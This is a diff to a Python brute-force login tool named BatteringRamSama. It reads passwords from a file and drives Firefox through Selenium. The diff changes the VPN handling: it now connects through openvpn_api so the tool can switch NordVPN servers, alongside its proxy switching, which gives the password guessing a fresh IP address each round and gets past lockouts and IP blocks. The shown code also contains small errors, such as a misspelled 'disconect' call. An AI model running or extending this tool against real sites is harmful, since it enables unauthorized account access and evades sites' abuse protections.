@@ -9,6 +9,7 @@ Created on Thu Jul 16 13:15:02 2020
 
 from selenium import webdriver
 from getProxies import getProxies
+import openvpn_api.VPN
 import configparser as cp
 import time
 import calendar
@@ -25,7 +26,10 @@ def linuxNordVPN(i,usrname,passwd):
             vpnlist.append(vpn)
         else:
             break
-     os.system("openvpn")
+    v = openvpn_api.VPN('localhost', 7505)
+    v.connect()
+    return v
+    
     
 def changeProxy(PROXY_HOST,PROXY_PORT):
     fp = webdriver.FirefoxProfile()
@@ -77,6 +81,7 @@ class BatteringRamSama():
         
     def BruteForceTime(self):
         f=open(self.passwordFile,'r')
+        nordVPN=0
         password='greaterThanOne'
         counter=self.changeProxy
         first=True
@@ -91,7 +96,9 @@ class BatteringRamSama():
                     if not first:
                         self.driver.close()        
                     if self.nord:
-                        linuxNordVPN(i,self.nordUsername,self.nordPassword)
+                        if nordVPN!=0:
+                            nordVPN.disconect()                       
+                        nordVPN=linuxNordVPN(i,self.nordUsername,self.nordPassword)
                         self.driver=webdriver.Firefox()
                     else:
                         self.driver=changeProxy(self.proxyAddresses[i],self.proxyPorts[i])
